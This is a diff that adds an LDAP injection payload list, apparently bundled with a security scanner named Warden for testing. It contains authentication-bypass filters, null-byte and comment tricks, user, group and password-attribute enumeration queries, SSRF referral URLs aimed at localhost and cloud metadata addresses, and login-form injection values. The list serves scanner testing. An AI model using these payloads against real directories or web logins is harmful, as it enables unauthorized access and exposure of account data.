@@ -1,0 +1,549 @@
+# LDAP (Lightweight Directory Access Protocol) Security Test Payloads
+# Embedded in Warden binary
+# For testing LDAP injection and security misconfigurations
+
+# ============================================================================
+# LDAP INJECTION - AUTHENTICATION BYPASS
+# ============================================================================
+
+# Always-true filter bypass
+(&(objectClass=*))
+(password=*)
+(|(objectClass=*)(userPassword=*))
+(&(objectClass=*)(!(objectClass=*)))(userPassword=*
+*))(&
+*)))%00
+(&(objectClass=*)(cn=*
+(&(objectClass=*)(uid=*
+(&(objectClass=*)(sAMAccountName=*
+
+# OR injection for bypass
+(|(password=*)(userPassword=*))
+(|(cn=*)(uid=*))
+(|(userPassword=*)(unicodePwd=*))
+(|(cn=*)(objectClass=*))
+(|(sAMAccountName=*)(cn=*))
+
+# AND injection
+(&(cn=*)(objectClass=*))
+(&(uid=admin)(|(objectClass=*)))
+(&(objectClass=user)(!(objectClass=computer)))
+
+# Parenthesis manipulation
+(&(objectClass=user)(cn=*)(
+))(|(objectClass=*))
+*)(&(objectClass=*))(
+(&(cn=*))%00
+
+# Comment-based bypass
+(&(cn=admin)(!(cn=*))%00
+(&(cn=admin)%00
+(&(cn=admin)#)
+(&(cn=admin)/*)
+(&(objectClass=*))--
+
+# Null byte injection
+(&(cn=admin)\x00)
+(&(cn=admin)\x00(&(objectClass=*)))
+(user=*\x00)
+(password=\x00)
+
+# Wildcard enumeration
+(cn=*)
+(uid=*)
+(sAMAccountName=*)
+(userPrincipalName=*)
+(mail=*)
+(displayName=*)
+(givenName=*)
+(sn=*)
+(telephoneNumber=*)
+(memberOf=*)
+
+# ============================================================================
+# AUTHENTICATION - ANONYMOUS/NULL BIND
+# ============================================================================
+
+# Anonymous bind attempts
+(empty username)
+(empty password)
+(username=&password=)
+(uid=&userpassword=)
+(cn=&userpassword=)
+
+# NULL bind
+NULL
+\x00
+(null)
+(nil)
+(undefined)
+
+# Guest/anonymous access
+anonymous
+guest
+(Optional)
+(Empty)
+
+# ============================================================================
+# AUTHENTICATION - CREDENTIAL BYPASS
+# ============================================================================
+
+# Password bypass attempts
+(password=*)
+(userPassword=*)
+(unicodePwd=*)
+(clearTextPassword=*)
+(|(password=*)(userPassword=*))
+
+# Principal bypass
+(sAMAccountName=*)(userPassword=*)
+(userPrincipalName=*)(userPassword=*)
+(uid=*)(userpassword=*)
+
+# Special characters for bypass
+(cn=admin*)(objectClass=*)
+(cn=admin*)(
+(cn=admin*))(
+(cn=admin*)#
+(cn=admin*)//
+
+# ============================================================================
+# INFORMATION DISCLOSURE - ROOT DSE
+# ============================================================================
+
+# Root DSE queries
+(objectClass=*)
+(objectClass=top)
+(namingContexts=*)
+(defaultNamingContext=*)
+(schemaNamingContext=*)
+(configurationNamingContext=*)
+(rootDomainNamingContext=*)
+(supportedLDAPVersion=*)
+(supportedExtension=*)
+(supportedControl=*)
+(supportedSASLMechanisms=*)
+
+# Server info
+(serverName=*)
+(ldapServiceName=*)
+(dnsHostName=*)
+(serverReference=*)
+
+# ============================================================================
+# INFORMATION DISCLOSURE - NAMING CONTEXT
+# ============================================================================
+
+# Naming context discovery
+(namingContexts=*)
+(defaultNamingContext=*)
+(dc=*)
+(o=*)
+(ou=*)
+
+# Domain info
+(dc=example)
+(dc=com)
+(dc=domain)
+(dc=local)
+(dc=corp)
+
+# ============================================================================
+# INFORMATION DISCLOSURE - SCHEMA ENUMERATION
+# ============================================================================
+
+# Schema queries
+(objectClass=*)
+(subschemaSubentry=*)
+(schemaNamingContext=*)
+(attributeTypes=*)
+(objectClasses=*)
+(matchingRules=*)
+(matchingRuleUse=*)
+(ditStructureRules=*)
+(ditContentRules=*)
+(nameForms=*)
+
+# Common object classes
+(objectClass=user)
+(objectClass=person)
+(objectClass=organizationalPerson)
+(objectClass=inetOrgPerson)
+(objectClass=group)
+(objectClass=groupOfNames)
+(objectClass=organizationalUnit)
+(objectClass=computer)
+(objectClass=domain)
+
+# ============================================================================
+# USER ENUMERATION
+# ============================================================================
+
+# User object class filters
+(objectClass=user)
+(objectClass=person)
+(objectClass=organizationalPerson)
+(objectClass=inetOrgPerson)
+(objectClass=posixAccount)
+(objectClass=shadowAccount)
+(objectClass=simpleSecurityObject)
+
+# Common user attributes
+(uid=*)
+(cn=*)
+(sAMAccountName=*)
+(userPrincipalName=*)
+(mail=*)
+(displayName=*)
+(givenName=*)
+(sn=*)
+(initials=*)
+(description=*)
+
+# Account status filters
+(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))
+(&(objectClass=user)(!(pwdLastSet=0)))
+
+# Search for admin users
+(&(objectClass=user)(cn=*admin*))
+(&(objectClass=user)(sAMAccountName=*admin*))
+(&(objectClass=user)(memberOf=CN=Administrators,*))
+(&(objectClass=user)(memberOf=CN=Domain Admins,*))
+(&(objectClass=user)(userPrincipalName=*admin*))
+
+# Service account discovery
+(&(objectClass=user)(cn=*service*))
+(&(objectClass=user)(cn=*svc*))
+(&(objectClass=user)(cn=*sql*))
+(&(objectClass=user)(cn=*iis*))
+
+# ============================================================================
+# GROUP ENUMERATION
+# ============================================================================
+
+# Group object class filters
+(objectClass=group)
+(objectClass=groupOfNames)
+(objectClass=groupOfUniqueNames)
+(objectClass=posixGroup)
+(objectClass=organizationalRole)
+
+# High-privilege groups
+(cn=Domain Admins)
+(cn=Enterprise Admins)
+(cn=Administrators)
+(cn=Schema Admins)
+(cn=Backup Operators)
+(cn=Account Operators)
+(cn=Domain Controllers)
+(cn=Group Policy Creator Owners)
+(cn=Read-Only Domain Controllers)
+(cn=Enterprise Read-Only Domain Controllers)
+
+# Group member enumeration
+(member=*)
+(memberOf=*)
+(uniqueMember=*)
+(roleOccupant=*)
+(owner=*)
+
+# Find group membership
+(&(objectClass=user)(memberOf=*))
+(&(objectClass=user)(memberOf=CN=Domain Admins,*))
+(&(objectClass=group)(member=*))
+(sAMAccountName=*)(objectClass=group)
+
+# ============================================================================
+# ATTRIBUTE ENUMERATION
+# ============================================================================
+
+# Password-related attributes (high value targets)
+(userPassword=*)
+(unicodePwd=*)
+(clearTextPassword=*)
+(pwdLastSet=*)
+(pwdHistory=*)
+(userAccountControl=*)
+(unicodePwd=*)
+(ntPwd=*)
+(lmPwd=*)
+
+# Contact information
+(mail=*)
+ telephoneNumber=*)
+(mobile=*)
+(pager=*)
+(homePhone=*)
+(facsimileTelephoneNumber=*)
+
+# Address info
+(st=*)
+(l=*)
+(streetAddress=*)
+(postalCode=*)
+(postalcode=*)
+
+# Organization info
+(department=*)
+(company=*)
+(title=*)
+(manager=*)
+(directReports=*)
+
+# Session info
+(logonCount=*)
+(lastLogon=*)
+(lastLogonTimestamp=*)
+(logonHours=*)
+(logonWorkstation=*)
+
+# Account details
+(accountExpires=*)
+(badPwdCount=*)
+(badPasswordTime=*)
+(codePage=*)
+(countryCode=*)
+(primaryGroupID=*)
+
+# ============================================================================
+# REFERRAL ABUSE - SSRF
+# ============================================================================
+
+# Localhost referrals
+ldap://localhost:389/
+ldap://127.0.0.1:389/
+ldap://[::1]:389/
+ldap://0.0.0.0:389/
+ldap://127.1:389/
+ldaps://localhost:636/
+
+# Cloud metadata referrals
+ldap://169.254.169.254/
+ldap://metadata.google.internal/
+ldap://100.100.100.200/
+
+# Internal service referrals
+ldap://localhost:11211/
+ldap://localhost:3306/
+ldap://localhost:6379/
+ldap://localhost:27017/
+ldap://localhost:9200/
+
+# Alternative protocol referrals
+ldap://localhost:389/???referrals=on
+ldap://127.0.0.1:389/??(objectClass=*)
+ldap://[::1]/?(objectclass=*)
+
+# ============================================================================
+# PRIVILEGE ESCALATION - GROUP MANIPULATION
+# ============================================================================
+
+# Add self to privileged groups (injection)
+(member:1.2.840.113556.1.4.804:=cn=attacker,ou=users,dc=domain,dc=local))
+(memberOf:1.2.840.113556.1.4.804:=cn=Domain Admins,ou=groups,dc=domain,dc=local)
+
+# Modify group membership
+(&(objectClass=group)(member=*admin*))
+(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=cn=admin,*))
+
+# Find writeable groups
+(&(objectClass=group)(!(groupType:1.2.840.113556.1.4.803:=2147483648)))
+(&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=-2147483646))
+
+# Universal groups (can be modified)
+(&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=8))
+(&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=2))
+
+# ============================================================================
+# PASSWORD ATTACKS
+# ============================================================================
+
+# Password policy disclosure
+(pwdProperties=*)
+(pwdHistoryLength=*)
+(pwdMinLength=*)
+(pwdMaxAge=*)
+(pwdMinAge=*)
+(pwdComplexity=*)
+
+# Password change attempts
+(unicodePwd=Password123)
+(userPassword=Password123)
+(clearTextPassword=Password123)
+
+# Password reset via injection
+(&(objectClass=user)(sAMAccountName=target)(unicodePwd=*))%00
+(&(objectClass=user)(cn=target)(userPassword=*))%00
+
+# ============================================================================
+# ACCOUNT ENUMERATION
+# ============================================================================
+
+# Active accounts
+(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
+(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=514)))
+(&(objectClass=user)(!(pwdLastSet=0)))
+(&(objectClass=user)(!(accountExpires=0)))
+
+# Disabled accounts
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=514))
+
+# Locked accounts
+(&(objectClass=user)(lockoutTime=*)(!(lockoutTime=0)))
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=16))
+
+# Password never expires
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
+
+# Password not required
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))
+
+# ============================================================================
+# COMPUTER ENUMERATION
+# ============================================================================
+
+# Computer objects
+(objectClass=computer)
+(&(objectClass=computer)(cn=*))
+(&(objectClass=computer)(operatingSystem=*))
+(&(objectClass=computer)(dNSHostName=*))
+
+# Domain controllers
+(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))
+(&(objectClass=computer)(primaryGroupID=516))
+(cn=Domain Controllers)
+
+# Server enumeration
+(&(objectClass=computer)(operatingSystem=*Server*))
+(&(objectClass=computer)(operatingSystem=*Windows*))
+
+# ============================================================================
+# COMMON BASE DNs
+# ============================================================================
+
+dc=example,dc=com
+dc=domain,dc=local
+dc=corp,dc=com
+dc=local
+dc=example,dc=org
+dc=test,dc=local
+o=organization
+ou=users,dc=domain,dc=local
+ou=people,dc=example,dc=com
+ou=groups,dc=example,dc=com
+cn=users,dc=domain,dc=local
+cn=admins,dc=domain,dc=local
+ou=admin,dc=example,dc=com
+ou=system,dc=domain,dc=local
+
+# ============================================================================
+# SEARCH FILTERS - ADVANCED
+# ============================================================================
+
+# Presence filter
+(userPassword=*)
+(telephoneNumber=*)
+(mail=*)
+
+# Approximate match
+(sn~=admin)
+(cn~=administrator)
+
+# Extensible match - userAccountControl
+(userAccountControl:1.2.840.113556.1.4.803:=2)
+(userAccountControl:1.2.840.113556.1.4.803:=512)
+
+# LDAP AND/OR combinations
+(&(objectClass=user)(cn=admin*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
+(|(objectClass=user)(objectClass=person))
+(&(objectClass=group)(|(cn=*admin*)(cn=*priv*)))
+
+# Negation filters
+(!(objectClass=computer))
+(!(userAccountControl:1.2.840.113556.1.4.803:=2))
+(!(pwdLastSet=0))
+
+# ============================================================================
+# FILTER MANIPULATION - BYPASS TECHNIQUES
+# ============================================================================
+
+# Filter termination
+(*)(&
+*))(&
+*))(|(
+*)(&(
+
+# Comment-based
+*)(%00
+*)#
+*)//
+
+# Expression bypass
+*))%00
+*))#
+*))/*
+*))--
+
+# ============================================================================
+# SPECIAL CHARACTERS FOR BLIND TESTING
+# ============================================================================
+
+# Timing-based blind injection
+(&(objectClass=user)(sAMAccountName=*)(|(pwdLastSet=*)(pwdLastSet=*)
+(&(objectClass=user)(sAMAccountName=admin*)(|(userPassword=*)(userPassword=*))
+
+# Error-based blind injection
+(&(objectClass=user)(sAMAccountName=*)(|(userPassword=*)(userPassword=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)
+
+# ============================================================================
+# PROTOCOL-SPECIFIC PAYLOADS
+# ============================================================================
+
+# Active Directory specific
+(objectCategory=person)
+(objectClass=user)(objectCategory=person)
+(sAMAccountName=*)(objectClass=user)
+(objectSid=*)
+(objectGUID=*)
+(msDS-GroupMSAMembership=*)
+
+# OpenLDAP specific
+(entryDN=*)
+(structuralObjectClass=*)
+(createTimestamp=*)
+(modifyTimestamp=*)
+
+# POSIX attributes
+(uidNumber=*)
+(gidNumber=*)
+(homeDirectory=*)
+(loginShell=*)
+(givenName=*)
+(gecos=*)
+
+# ============================================================================
+# WEB APPLICATION LDAP INJECTION
+# ============================================================================
+
+# Login form bypass
+username=admin*)(objectClass=user))%00
+username=admin*)(&password=*
+username=admin*))%00
+username=admin*)(&(password=*
+username=admin*))(|(password=*
+username=*))%00&password=anything
+
+# Search form injection
+search=*))%00
+search=admin*)(|(cn=*
+search=*))(&(objectClass=*
+search=*))(|(password=*
+
+# Filter parameter injection
+filter=*))%00
+filter=*)(&(objectClass=*
+filter=*)(cn=*
+filter=admin*)(|(password=*
